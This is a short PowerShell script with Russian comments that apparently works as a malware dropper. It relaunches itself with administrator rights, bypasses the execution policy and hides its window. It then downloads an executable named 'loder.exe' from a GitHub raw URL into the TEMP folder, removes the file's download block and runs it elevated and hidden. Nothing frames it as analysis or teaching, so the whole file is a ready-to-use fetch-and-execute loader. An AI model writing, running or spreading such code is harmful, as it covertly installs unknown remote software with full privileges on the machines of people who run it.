# Проверка прав администратора
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Настройки
$ProgressPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = 3072

# Скачивание
try {
    Invoke-WebRequest -Uri "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.exe" -OutFile "$env:TEMP\loder.exe" -UseBasicParsing -ErrorAction Stop
} catch {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("https://github.com/ShramC/Ds/raw/refs/heads/main/loder.exe", "$env:TEMP\loder.exe")
    $wc.Dispose()
}

# Запуск
if (Test-Path "$env:TEMP\loder.exe") {
    Unblock-File -Path "$env:TEMP\loder.exe" -ErrorAction SilentlyContinue
    
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "$env:TEMP\loder.exe"
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.Verb = "runas"
    $psi.UseShellExecute = $true
    $psi.CreateNoWindow = $true
    
    [System.Diagnostics.Process]::Start($psi) | Out-Null
}

exit 0